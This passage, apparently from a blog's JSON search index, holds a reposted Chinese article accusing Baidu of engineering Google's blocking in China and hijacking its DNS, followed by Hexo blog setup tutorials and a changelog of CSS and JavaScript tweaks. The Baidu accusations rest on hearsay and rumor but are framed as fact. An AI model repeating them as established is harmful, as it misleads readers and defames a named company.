这一事件前前后后网上传言众多，但可以肯定的是，没有搜索引擎公司百度的幕后操作，就不会有封杀全球最伟大的搜索引擎Google.Google假如进入中国市场，对百度的打击是毁灭性的，但一个精心策划的阴谋使得百度公司不仅逃过一劫，还能长治久安，并且当年就通过向本来可能是Google客户的Sohu、Sina、网易、中国雅虎卖自己的搜索引擎服务获利近两百万美元。\n更为让人吃惊的是，据有人称，Google被封杀后，篡改GoogleDNS指向的人中即有百度。这一推测其实也很容易成立：虽然篡改DNS违反中国法律，但百度在当时特定情况下断定政府不会追查此事，所以在整死Google后还分Google的残骸，篡改DNS，把访问Google的用户引到百度网站，为了分散网民的注意，又把其它如北大天网、ENet等一些不相干的网站拉下水。其实有聪明的用户稍加分析就可以明白，中国提供搜索引擎的网站那么多，但Google被篡改的DNS后指向的网站为什么只有百度一个是真正概念上的搜索引擎呢？而没有比较知名的搜索网站sohu、sina、yahoo？\n虽然Google被封杀已成昨日烟云，但今天的Google中文的使用仍然在国内受到很多网络技术的限制。在Google的Keywords、Cache、Spider等程序服务中，Google中文网站受到一套相当完善的技术限制，有朋友称，百度的几名核心程序员参与了这一套Google限制技术的开发和技术支持。Google已经成为互联网上搜索引擎的代名词时，只有中国不能真正的使用他，而这套技术的创意与提供，却正是中国的搜索引擎公司百度。\n因为一个公司的私利、中国5600万网民不能方便的得用互联网查询资料，因为一个公司的阴谋，整个中国互联网的信息利用向后退了一大步。我前后接触了几个与事件相关的人物，通过私下交流中获得一些信息，把事实与内幕记录下来，只是想澄清中国互联网发展史上的一个令人震惊的事实，让众人明白一个问题：是谁在为中国的搜索引擎服务做贡献，是谁在残害中国的搜索引擎服务。 （文/Tubleaqis，来源：文学城）\n转自月光博客\n","permalink":"https://xhstormr.github.io/blog/posts/baidu-original-sin/","summary":"","title":"百度的原罪—封杀Google的黑内幕"},{"content":"配置Hexo 站点配置用到两个文件 :\n对博客的配置 H:\\hexo\\_config.yml 对主题的配置 H:\\hexo\\themes\\light_config.yml 对博客的配置 H:\\hexo\\_config.yml\n# Hexo Configuration ## Docs: http://zespia.tw/hexo/docs/configure.html ## Source: https://github.com/tommy351/hexo/ # Site 这里的配置，哪项配置反映在哪里，可以参考我的博客 title: Zippera\u0026#39;s blog #站点名，站点左上角 subtitle: Walk steps step by step #副标题，站点左上角 description: Walk steps step by step #给搜索引擎看的，对站点的描述，可以自定义 author: zippera #在站点左下角可以看到 email: #你的联系邮箱 language: zh-CN #中国人嘛，用中文 # URL #这项暂不配置，绑定域名后，欲创建sitemap.xml需要配置该项 ## If your site is put in a subdirectory, set url as \u0026#39;http://yoursite.com/child\u0026#39; and root as \u0026#39;/child/\u0026#39; url: http://zipperary.com root: / permalink: :year/:month/:day/:title/ tag_dir: tags archive_dir: archives category_dir: categories # Writing 文章布局、写作格式的定义，不修改 new_post_name: :title.md # File name of new posts default_layout: post auto_spacing: false # Add spaces between asian characters and western characters titlecase: false # Transform title into titlecase max_open_file: 100 filename_case: 0 highlight: enable: true backtick_code_block: true line_number: true tab_replace: # Category \u0026amp; Tag default_category: uncategorized category_map: tag_map: # Archives 默认值为2，这里都修改为1，相应页面就只会列出标题，而非全文 ## 2: Enable pagination ## 1: Disable pagination ## 0: Fully Disable archive: 1 category: 1 tag: 1 # Server 不修改 ## Hexo uses Connect as a server ## You can customize the logger format as defined in ## http://www.senchalabs.org/connect/logger.html port: 4000 logger: false logger_format: # Date / Time format 日期格式，不修改 ## Hexo uses Moment.js to parse and display date ## You can customize the date format as defined in ## http://momentjs.com/docs/#/displaying/format/ date_format: MMM D YYYY time_format: H:mm:ss # Pagination 每页显示文章数，可以自定义，我将10改成了5 ## Set per_page to 0 to disable pagination per_page: 5 pagination_dir: page # Disqus Disqus插件，我们会替换成“多说”，不修改 disqus_shortname: # Extensions 这里配置站点所用主题和插件，暂默认，后面会介绍怎么修改 ## Plugins: https://github.com/tommy351/hexo/wiki/Plugins ## Themes: https://github.com/tommy351/hexo/wiki/Themes theme: light exclude_generator: plugins: - hexo-generator-feed - hexo-generator-sitemap # Deployment 站点部署到github要配置，上一节中已经讲过 ## Docs: http://zespia.tw/hexo/docs/deploy.html deploy: type: github repository: https://github.com/zippera/zippera.github.io.git branch: master 对主题的配置 H:\\hexo\\themes\\light_config.yml\nmenu: #站点右上角导航栏，暂时默认，后面介绍修改 首页: / 存档: /archives 关于: /about ToDo: /todolist widgets: #站点右边栏，暂时默认，后面介绍修改和添加 - search - category - tagcloud - weibo - blogroll excerpt_link: 阅读全文 #替换为中文 plugins: twitter: #右边栏要显示twitter展示的话，需要在此设置 username: moxie198 show_replies: false tweet_count: 5 addthis: #SNS分享 enable: true pubid: facebook: true twitter: true google: true pinterest: true fancybox: true #图片效果，默认 google_analytics: #要使用google_analytics进行统计的话，这里需要配置ID，暂时默认，后面介绍 rss: #生成RSS，需要配置路径，暂时默认，后面介绍 新建一篇photo文章 hexo new photo \u0026#34;my new photo\u0026#34; 新建一个页面 hexo new page \u0026#34;my new page\u0026#34; 新建一篇文章 hexo new post \u0026#34;my new post\u0026#34; #hexo n \u0026#34;my new post\u0026#34; 在H:\\hexo\\source_posts中打开这个文件（打开方式用“记事本”即可），配置开头。\ntitle: title #文章标题 date: 2015-02-05 12:47:44 #文章生成时间 categories: #文章分类目录，可以为空，注意:后面有个空格 tags: #文章标签，可空，多标签请用格式[tag1,tag2,tag3]，注意:后面有个空格 description: #你对本页的描述 可以省略 --- 这里开始使用markdown格式输入你的正文。 想在首页文章预览添加图片可以添加photo参数 这个需要fancybox=true 如下:\nphotos: - http://bruce.u.qiniudn.com/2013/11/27/reading/photos-0.jpg 主页文章显示摘要 编辑md文件的时候，在要作为摘要的文字后面添加即可。\n以上是文章摘要 \u0026lt;!-- more --\u0026gt; 以下是余下全文 不解析Html文件 hexo默认是解析html文件的，于是，html文件只要放入相应目录下命名好，hexo解析完成，将其作为一篇“文章”“插入”到模板中。如果不希望被解析，在单个html文件开头添加如下信息：\nlayout: false --- 生成post时默认生成categories配置项 在scaffolds/post.md中，添加一行categories:。同理可应用在page.md和photo.md。\n添加RSS和Sitemap插件 npm install hexo-generator-feed npm install hexo-generator-sitemap 在博客配置文件中启用插件\nplugins: - hexo-generator-feed - hexo-generator-sitemap 文章中插入图片 使用本地路径：在hexo/source目录下新建一个uploads文件夹，将图片放入该文件夹下，插入图片时链接即为/uploads/图片名称。 使用微博等图床，推荐七牛。 批量部署 编辑 _config.yml。\ndeploy: type: git message: [message] repo: github: git@github.com:XhstormR/XhstormR.github.io.git,master gitcafe: git@gitcafe.com:XhstormR/XhstormR.git,gitcafe-pages 通过SSH建立Github与本地的通信 $ ssh -T git@github.com ","permalink":"https://xhstormr.github.io/blog/posts/github-page-hexo2/","summary":"","title":"Hexo(二)"},{"content":" 仅针对Windows平台\n纯绿色,全便携\n下载运行环境 下载Node.js官方EXE单文件版程序：\nhttp://nodejs.org/download/\n选择Windows Binary(.exe)即可。\n将node.exe添加到系统环境变量Path中。\n从0.6.1开始，Node.js在Windows平台上提供了两种安装方式，一是.MSI安装文件，另外还有一个.EXE可执行文件。\n我选择了.EXE文件。因为.MSI安装文件除了将node.exe复制到C:\\Program File (x86)\\目录中及修改系统Path之外，没发现还有其他作用。\n下载便携版Git :\nhttps://github.com/msysgit/msysgit/releases/latest\n选择PortableGit-1.9.5-preview20141217.7z解压即可。\n下载npm源代码：\nhttps://github.com/npm/npm/releases/latest\n选择Source code(zip)解压即可。\n在命令提示符窗口中执行下面的操作，完成npm的编译：\nC:\\\u0026gt;D: D:\\\u0026gt;cd npmjs D:\\npmjs\u0026gt;node cli.js install -gf 还有一种安装npm的方法,虽然很麻烦,但更绿色,我就是用的这种.\n1. 新建一个文件夹如D:\\Node,在其中新建npm-cache,npm-global二个文件夹.把node.exe和解压好的npm源文件放在Node中. 2. 在D:\\Node\\node_modules中再复制一个npm文件夹(node.exe也要在其中). 3. 把D:\\Node\\bin中的npm,npm.cmd2个文件复制到D:\\Node中. 4. 把npm-global文件夹添加到系统环境变量Path中. 5. 然后在CMD中运行 : npm config set prefix \u0026quot;D:\\Node\\npm-global\u0026quot; #全局安装路径 npm config set cache \u0026quot;D:\\Node\\npm-cache\u0026quot; #缓存文件路径 下载Hexo\n在解压后的PortableGit中运行Git bash.bat，输入npm 命令 ,Hexo就下载到本地了。\n$ npm install hexo -g 搭建Hexo 新建一个需要当做目录的文件夹(如H:\\hexo)。\n进入该文件夹之后,加入hexo程序和npm依赖包。\n$ hexo init $ npm install 现在我们已经搭建起本地的hexo了，执行以下命令(在H:\\hexo)，然后到浏览器输入localhost:4000看看。\nhexo generate #生成静态页面至public目录 hexo server #开启预览访问端口（默认端口4000，\u0026#39;ctrl + c\u0026#39;关闭server） 没有错误,便可以部署至Github了。\nhexo clean #清除缓存 网页正常情况下可以忽略此条命令 hexo generate #生成静态页面至public目录 hexo deploy #将.deploy目录部署到GitHub Tips 每次使用命令时，都要在H:\\hexo目录下，在Git bash.bat中输入。每次修改本地文件后，需要hexo generate才能保存。\nHexo现在支持更加简单的命令格式了，比如：\nhexo n == hexo new hexo g == hexo generate hexo s == hexo server hexo d == hexo deploy 想要在生成后发布，你可以运行下面命令中的任何一个，效果都是相同的。\nhexo generate -deploy hexo deploy -generate ","permalink":"https://xhstormr.github.io/blog/posts/github-page-hexo1/","summary":"","title":"Hexo(一)"},{"content":" 我把我对本博客的一些更新整理在这里，以便查阅。\n后来因为太懒，就不整理了。😃\nHighlight \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;http://apps.bdimg.com/libs/highlight.js/9.1.0/styles/monokai_sublime.min.css\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;http://apps.bdimg.com/libs/highlight.js/9.1.0/highlight.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;hljs.initHighlightingOnLoad();\u0026lt;/script\u0026gt; Scrollbar : : -webkit-scrollbar-track-piece { background-color: #FFFFFF; } : : -webkit-scrollbar-track-piece: horizontal { background-color: #23241f; } : : -webkit-scrollbar { height: 12px; width: 9px; } : : -webkit-scrollbar-thumb { background: #969CBD; } Font *: not([class*=\u0026#34;icon\u0026#34;]): not(i) { font-family: \u0026#34;Microsoft YaHei\u0026#34;,\u0026#34;Symbol\u0026#34; !important; } Particle \u0026lt;canvas id=\u0026#34;reactive-bg-canvas\u0026#34;\u0026gt;\u0026lt;/canvas\u0026gt; \u0026lt;script src=\u0026#34;http://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;http://cdn.bootcss.com/gsap/1.18.2/TweenLite.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;magic-canvas.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;$.magicCanvas.draw({type:\u0026#34;random-move\u0026#34;,rgb:function (circlePos) {var px = circlePos.x;var py = circlePos.y;return {r:0,g:0,b:0};}})\u0026lt;/script\u0026gt; Scroll Mouse function scrollPlus() { function e() { return m ? void 0 : (m = document.createElement(\u0026#34;div\u0026#34;), m.setAttribute(\u0026#34;id\u0026#34;, \u0026#34;IndicatorBox\u0026#34;), m.setAttribute(\u0026#34;style\u0026#34;, \u0026#34;width:\u0026#34; + i + \u0026#34;%;background:\u0026#34; + l + \u0026#34;;min-height:\u0026#34; + d + \u0026#34;px;text-align:center;position: fixed; top: -40px; right: 0;overflow: hidden; z-index: 102400;font-family:Arial !important;cursor:n-resize;cursor:ns-resize;\u0026#34;), document.body.appendChild(m), m.addEventListener(\u0026#34;click\u0026#34;, function() { a = 0 }, !1), !0) } function t() { var e = document.createElement(\u0026#34;a\u0026#34;); e.id = \u0026#34;scrollUpIco\u0026#34;, e.textContent = \u0026#34;Top\u0026#34;, e.addEventListener(\u0026#34;click\u0026#34;, function() { window.scrollTo(0, document.body.scrollLeft) }, !1), document.body.appendChild(e), GM_addStyle(\u0026#34;\t#scrollUpIco {\tposition: fixed;\tz-index: 2147483647;\twidth: 50px;\theight: 50px;\tborder-radius: 25px;\tbottom: 20px;\tright: 25px;\tline-height: 50px;\ttext-align: center;\tfont-weight: bold;\tbackground-color: rgba(0, 0, 0, 0.3);\tcolor: #fff;\ttext-decoration: none;\t-moz-user-select:none;\t-webkit-user-select:none;\tcursor:default;\t}\t#scrollUpIco:hover {\tbackground-color: rgba(0, 0, 0, 0.75);\tcolor: #fff !important;\t}\u0026#34;) } var o, n = 1,c = 1,i = 5,l = \u0026#34;rgba(29,163,63, 0.4)\u0026#34;,d = 20,r = 10,u = 1,s = -1,m = 0, = 0; document.addEventListener(\u0026#34;mousemove\u0026#34;, function(t) { if (\u0026#34;true\u0026#34; != document.body.contentEditable) { var n = Math.max(document.body.scrollHeight, document.documentElement.scrollHeight), l = Math.max(document.body.clientWidth, document.documentElement.clientWidth) - r, p = window.innerHeight, f = window.innerHeight - 2 * r; if (n \u0026gt; p) { if (t.clientX \u0026gt; l) switch (u) { case 1: a = 1; break; case 2: t.ctrlKey \u0026amp;\u0026amp; (a = 1); break; case 3: t.clientY \u0026gt; p / 2 - 50 \u0026amp;\u0026amp; t.clientY \u0026lt; p / 2 + 50 \u0026amp;\u0026amp; (a = 1) } t.clientX \u0026lt; (1 - i / 100) * l \u0026amp;\u0026amp; (a = 0) } if (a) { if (1 == c \u0026amp;\u0026amp; e(), -1 != s) { o = t.ctrlKey ? n / f / 2 : n / f, m \u0026amp;\u0026amp; (m.style.top = t.clientY - d / 2 + \u0026#34;px\u0026#34;); var b = o * (t.clientY - s); document.body.scrollTop += b, document.documentElement.scrollTop += b, t.clientY + 20 \u0026gt; p \u0026amp;\u0026amp; (document.body.scrollTop += 10 * o, document.documentElement.scrollTop += 10 * o), t.clientY \u0026gt; 0 \u0026amp;\u0026amp; t.clientY \u0026lt; 20 \u0026amp;\u0026amp; (document.body.scrollTop -= 10 * o, document.documentElement.scrollTop -= 10 * o) } s = t.clientY } else s = -1, m \u0026amp;\u0026amp; setTimeout(function() { m.style.top = \u0026#34;-200px\u0026#34; }, 200) } }, !1), document.addEventListener(\u0026#34;click\u0026#34;, function() { a = 0 }, !1), n \u0026amp;\u0026amp; t() } window === window.top \u0026amp;\u0026amp; \u0026#34;\u0026#34; !== window.document.title \u0026amp;\u0026amp; setTimeout(scrollPlus, 100); /*Gradient Image*/ img { opacity: 1; transition: opacity 0.6s; } img[data-src] { opacity: 0; } /*Selection*/ ::selection { background: #d6edff; color: #222; text-shadow: none; } /* Rotate*/ .rotate { transition: All 0.4s ease-in-out; -webkit-transition: All 0.4s ease-in-out; -moz-transition: All 0.4s ease-in-out; -o-transition: All 0.4s ease-in-out; } .rotate:hover { transform: rotate(360deg) scale(1.3); -webkit-transform: rotate(360deg) scale(1.3); -moz-transform: rotate(360deg) scale(1.3); -o-transform: rotate(360deg) scale(1.3); -ms-transform: rotate(360deg) scale(1.3); } ","permalink":"https://xhstormr.github.io/blog/posts/blog-changelog/","summary":"","title":"Blog Changelog"},{"content":" Categories Tags(Doesn\u0026rsquo;t mean anything) ","permalink":"https://xhstormr.github.io/blog/posts/categories-tags/","summary":"","title":"Categories \u0026 Tags"}]